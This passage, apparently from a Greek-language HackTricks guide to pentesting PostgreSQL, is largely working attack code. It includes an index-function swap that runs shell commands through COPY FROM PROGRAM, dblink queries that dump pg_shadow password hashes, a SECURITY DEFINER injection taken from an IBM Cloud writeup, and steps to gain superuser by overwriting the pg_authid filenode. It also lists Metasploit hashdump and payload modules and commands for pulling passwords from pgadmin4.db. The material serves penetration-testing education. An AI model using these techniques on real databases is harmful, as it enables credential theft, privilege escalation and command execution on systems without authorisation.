/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Στη συνέχεια, ο πίνακας `shell_commands_results` θα περιέχει την έξοδο του εκτελεσμένου κώδικα:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Τοπική Σύνδεση

Ορισμένες λανθασμένα διαμορφωμένες περιπτώσεις του postgresql μπορεί να επιτρέπουν τη σύνδεση οποιουδήποτε τοπικού χρήστη — είναι δυνατή η σύνδεση από 127.0.0.1 χρησιμοποιώντας τη **`dblink` συνάρτηση**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Σημειώστε ότι για να δουλέψει το προηγούμενο query **η συνάρτηση `dblink` πρέπει να υπάρχει**. Αν δεν υπάρχει μπορείτε να προσπαθήσετε να τη δημιουργήσετε με
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> Αν έχετε τον κωδικό ενός χρήστη με περισσότερα προνόμια, αλλά ο χρήστης δεν επιτρέπεται να συνδεθεί από εξωτερικό IP μπορείτε να χρησιμοποιήσετε την παρακάτω συνάρτηση για να εκτελέσετε ερωτήματα ως ο εν λόγω χρήστης:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Μπορείτε να ελέγξετε αν αυτή η συνάρτηση υπάρχει με:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Προσαρμοσμένη συνάρτηση ορισμένη από χρήστη με** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters were able to privesc inside a postgres instance provided by IBM, because they **found this function with the SECURITY DEFINER flag**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) a function with **SECURITY DEFINER is executed** with the privileges of the **user that owns it**. Therefore, if the function is **vulnerable to SQL Injection** or is doing some **privileged actions with params controlled by the attacker**, it could be abused to **escalate privileges inside postgres**.

In the line 4 of the previous code you can see that the function has the **SECURITY DEFINER** flag.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Και στη συνέχεια **εκτέλεσε εντολές**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce με PL/pgSQL

**PL/pgSQL** είναι μια **πλήρως εξοπλισμένη γλώσσα προγραμματισμού** που προσφέρει μεγαλύτερο διαδικαστικό έλεγχο σε σύγκριση με το **SQL**. Επιτρέπει τη χρήση **βρόχων** και άλλων **δομών ελέγχου** για να βελτιώσει τη λογική του προγράμματος. Επιπλέον, **SQL statements** και **triggers** έχουν τη δυνατότητα να καλούν functions που δημιουργούνται χρησιμοποιώντας τη **γλώσσα PL/pgSQL**. Αυτή η ενσωμάτωση επιτρέπει μια πιο ολοκληρωμένη και ευέλικτη προσέγγιση στον προγραμματισμό και την αυτοματοποίηση των βάσεων δεδομένων.\
**Μπορείς να καταχραστείς αυτή τη γλώσσα για να ζητήσεις από το PostgreSQL να brute-force τα credentials των χρηστών.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> Το ακόλουθο privesc vector είναι ιδιαίτερα χρήσιμο σε περιορισμένα SQLi πλαίσια, καθώς όλα τα βήματα μπορούν να εκτελεστούν μέσω nested SELECT statements

Αν μπορείς να **διαβάζεις και να γράφεις αρχεία του PostgreSQL server**, μπορείς να **γίνεις superuser** αντικαθιστώντας το on-disk filenode του PostgreSQL που σχετίζεται με τον εσωτερικό πίνακα `pg_authid`.

Διάβασε περισσότερα για **αυτήν την τεχνική** [**εδώ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Τα βήματα της επίθεσης είναι:

1. Βρες τον κατάλογο δεδομένων (PostgreSQL data directory)
2. Απόκτησε μια σχετική διαδρομή προς το filenode που σχετίζεται με τον πίνακα `pg_authid`
3. Κατέβασε το filenode μέσω των `lo_*` functions
4. Πάρε τον datatype που σχετίζεται με τον πίνακα `pg_authid`
5. Χρησιμοποίησε τον [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) για να [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); όρισε όλα τα `rol*` boolean flags σε 1 για πλήρη δικαιώματα.
6. Επαναφόρτωσε το επεξεργασμένο filenode μέσω των `lo_*` functions και υπεγράψε το αρχικό αρχείο στο δίσκο
7. _(Προαιρετικά)_ Εκκαθάρισε την in-memory cache των πινάκων τρέχοντας ένα ακριβό SQL query
8. Τώρα θα πρέπει να έχεις τα προνόμια ενός πλήρους superadmin.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### καταγραφή

Μέσα στο αρχείο _**postgresql.conf**_ μπορείτε να ενεργοποιήσετε τα postgresql logs αλλάζοντας:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Στη συνέχεια, **επανεκκινήστε την υπηρεσία**.

### pgadmin

[pgadmin](https://www.pgadmin.org) είναι μια πλατφόρμα διαχείρισης και ανάπτυξης για το PostgreSQL.\
Μπορείτε να βρείτε **passwords** μέσα στο _**pgadmin4.db**_ αρχείο\
Μπορείτε να τα αποκρυπτογραφήσετε χρησιμοποιώντας τη συνάρτηση _**decrypt**_ μέσα στο script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Η επικύρωση πελατών στο PostgreSQL διαχειρίζεται μέσω ενός αρχείου ρυθμίσεων με το όνομα **pg_hba.conf**. Το αρχείο αυτό περιέχει μια σειρά εγγραφών, καθεμία από τις οποίες καθορίζει τον τύπο σύνδεσης, το εύρος διευθύνσεων IP του client (αν ισχύει), το όνομα της βάσης δεδομένων, το όνομα χρήστη και τη μέθοδο authentication που θα χρησιμοποιηθεί για να ταιριάξει η σύνδεση. Η πρώτη εγγραφή που ταιριάζει στον τύπο σύνδεσης, στη διεύθυνση του client, στη ζητούμενη βάση δεδομένων και στο όνομα χρήστη χρησιμοποιείται για την επικύρωση. Δεν υπάρχει fallback ή εφεδρική μέθοδος εάν η επικύρωση αποτύχει. Αν δεν υπάρχει καμία εγγραφή που να ταιριάζει, η πρόσβαση απορρίπτεται.

Οι διαθέσιμες μέθοδοι authentication με βάση τον κωδικό στο **pg_hba.conf** είναι **md5**, **crypt**, και **password**. Αυτές οι μέθοδοι διαφέρουν στον τρόπο μετάδοσης του κωδικού: MD5-hashed, crypt-encrypted, ή clear-text. Είναι σημαντικό να σημειωθεί ότι η μέθοδος crypt δεν μπορεί να χρησιμοποιηθεί με κωδικούς που έχουν κρυπτογραφηθεί στο pg_authid.

## References

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
